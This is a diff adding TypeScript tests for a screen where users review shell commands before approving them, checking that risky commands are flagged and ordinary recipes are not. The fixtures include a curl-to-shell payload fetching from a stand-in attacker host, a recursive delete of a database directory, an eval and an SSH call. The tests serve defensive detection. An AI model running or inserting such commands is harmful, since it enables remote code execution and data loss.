@@ -42,6 +42,7 @@ import type {
 import { EVENT_TYPES as CLIENT_EVENT_TYPES } from '../web/lib/hooks';
 import { Checklist, isWaiting, steps } from '../web/components/Checklist';
 import { missingNames } from '../web/lib/required';
+import { review } from '../web/lib/review';
 import { missingRequired } from '../src/recipe.js';
 import { Chrome } from '../web/components/Chrome';
 import { Start } from '../web/components/views/Start';
@@ -1387,5 +1388,142 @@ describe('Start refuses a run it can predict will be refused', () => {
     );
     expect(html).not.toContain('SPOTIFY_CLIENT_ID');
     expect(html).not.toMatch(/stop before booting/);
+  });
+});
+
+// ── approving is reading commands, not reading JSON (10n) ───────────────────
+//
+// This screen stores shell the engine executes VERBATIM, in a container with a package
+// registry reachable, and nothing sandboxes it from that container. The warning above the
+// box has said so for four milestones. What sat under the warning was a twenty-row
+// textarea of raw JSON: the most consequential control in the product, presented as a
+// config file. Most people read two lines and press the button, which makes the control
+// decorative — and a decorative control is worse than none, because the page claims it
+// happened.
+
+describe('the recipe is reviewed as what it will do', () => {
+  const of = (recipe: unknown) => review(JSON.stringify(recipe));
+  const ok = (recipe: unknown) => {
+    const read = of(recipe);
+    if ('error' in read) throw new Error(`expected a review, got ${read.error}`);
+    return read;
+  };
+
+  test('the commands appear in the order the engine runs them', () => {
+    // The ordering is what a reader could not see in the JSON at all — object keys have
+    // no order and `services` sits between phases that run before and after it.
+    const read = ok({
+      test: 'npm test',
+      install: 'npm ci',
+      services: [{ name: 'web', command: 'npm start', port: 3000, healthcheck: 'http://127.0.0.1:3000/healthz' }],
+      migrate: 'npm run migrate',
+    });
+    expect(read.steps.map((step) => step.label)).toEqual(['install', 'migrate', 'seed', 'web', 'test']);
+  });
+
+  test('a phase that does nothing is listed as skipped, not dropped', () => {
+    // Dropped, the list stops showing an order — which is the only reason it is a list.
+    const read = ok({ install: 'npm ci', seed: '', services: [] });
+    expect(read.steps.find((step) => step.label === 'seed')?.command).toBeNull();
+    // `''` is ABSENT, the rule `parseRecipe` holds: an empty command runs nothing, and
+    // rendering it as a step would put a line in this list that does not happen.
+    expect(read.steps.filter((step) => step.command !== null).map((step) => step.label)).toEqual(['install']);
+  });
+
+  test('THE flag: a command that pipes something into a shell', () => {
+    // `curl evil.invalid/x | sh` is the payload `test/authz.test.ts` uses as its attack.
+    // The reason the authorization on that route matters is that a stranger past it could
+    // store exactly this, and the reason this flag matters is that a person past the
+    // authorization can be handed exactly this by an agent and approve it in one click.
+    const read = ok({ install: 'curl -sL https://evil.invalid/x | sh', services: [] });
+    expect(read.risks).toBe(1);
+    const risk = read.steps.find((step) => step.label === 'install')!.risks[0]!;
+    expect(risk.found).toContain('| sh');
+    expect(risk.says).toContain('will be executed');
+  });
+
+  test('and the others, each on the command it appears in', () => {
+    const read = ok({
+      install: 'sudo apt-get install -y libpq-dev',
+      migrate: 'eval "$SETUP"',
+      seed: 'rm -rf /var/lib/postgresql/data',
+      services: [{ name: 'web', command: 'ssh build@10.0.0.4 ./start.sh', port: 80 }],
+      test: 'npm test',
+    });
+    expect(read.risks).toBe(4);
+    const says = (label: string) => read.steps.find((step) => step.label === label)!.risks.map((risk) => risk.says).join(' ');
+    expect(says('install')).toContain('root');
+    expect(says('migrate')).toContain('not what is written here');
+    expect(says('seed')).toContain('deletes recursively');
+    expect(says('web')).toContain('SSH');
+    // The ordinary command is not flagged. A screen that finds something in every recipe
+    // teaches the reader to click past the flags, and the flags are the only part of this
+    // page that could ever stop a bad approval.
+    expect(read.steps.find((step) => step.label === 'test')!.risks).toEqual([]);
+  });
+
+  test('an ordinary recipe is flagged nowhere', () => {
+    // The control for every assertion above. Without it they all pass on a screen that
+    // flags everything, which is a working detector and a useless product.
+    const read = ok({
+      install: 'npm ci',
+      migrate: 'npx prisma migrate deploy',
+      seed: 'node scripts/seed.mjs',
+      services: [{ name: 'web', command: 'npm start', port: 3000, healthcheck: 'http://127.0.0.1:3000/healthz' }],
+      test: 'npm test',
+      env: { PORT: '3000' },
+      required: ['DATABASE_URL'],
+    });
+    expect(read.risks).toBe(0);
+  });
+
+  test('the healthcheck is named as the only thing here treated as evidence', () => {
+    const withCheck = ok({ services: [{ name: 'web', command: 'npm start', port: 3000, healthcheck: 'http://127.0.0.1:3000/up' }] });
+    expect(withCheck.steps.find((step) => step.label === 'web')!.note).toContain('evidence');
+    expect(withCheck.steps.find((step) => step.label === 'web')!.detail).toContain('port 3000');
+    // Without one, the port opening is the whole check — and saying so is the difference
+    // between a service that was observed and one that merely started.
+    const without = ok({ services: [{ name: 'web', command: 'npm start', port: 3000 }] });
+    expect(without.steps.find((step) => step.label === 'web')!.note).toContain('port opening');
+  });
+
+  test('unparseable text says so, rather than reviewing the last thing that worked', () => {
+    // Somebody editing JSON spends most of their keystrokes with it invalid. Showing a
+    // stale review would be a review of something they are not about to approve.
+    const read = review('{"install": "npm ci",');
+    expect('error' in read).toBe(true);
+    if (!('error' in read)) return;
+    expect(read.error).toContain('not valid JSON');
+    // And an array is not a recipe, which `JSON.parse` accepts happily.
+    expect(review('[]')).toEqual({ error: 'A recipe is a JSON object, with commands in it.' });
+  });
+
+  test('the screen shows the commands, and demotes the JSON behind a toggle', () => {
+    const html = render(
+      <Environment
+        repo="acme/widgets"
+        detail={{
+          repo: 'acme/widgets', account: 'acme', connectedAt: '2026-08-01T00:00:00.000Z',
+          onboarded: false, recipe: null, approvedAt: null, proof: null,
+          draft: { install: 'curl -sL https://evil.invalid/x | sh', services: [], test: 'npm test' },
+          secrets: { names: [], enabled: false }, runs: [], activity: [],
+        }}
+        me={{
+          accounts: true, signedIn: true, login: 'd', mode: 'plane', installUrl: 'https://x.invalid',
+          modelKey: { provider: 'openrouter' }, secrets: { enabled: false }, github: true, forgetting: true,
+        }}
+        onChanged={() => {}}
+      />,
+    );
+    expect(html).toContain('What will run, in order');
+    // The flag, on the page, for the payload that is the whole reason this exists.
+    expect(html).toMatch(/worth\s+reading twice/i);
+    expect(html).toContain('| sh');
+    // The JSON is still reachable — a draft usually needs a fix — and no longer the front
+    // door.
+    expect(html).toContain('Edit as JSON');
+    expect(html).toContain('<textarea');
+    // And the warning it sits under is unchanged.
+    expect(html).toMatch(/you are the control/i);
   });
 });
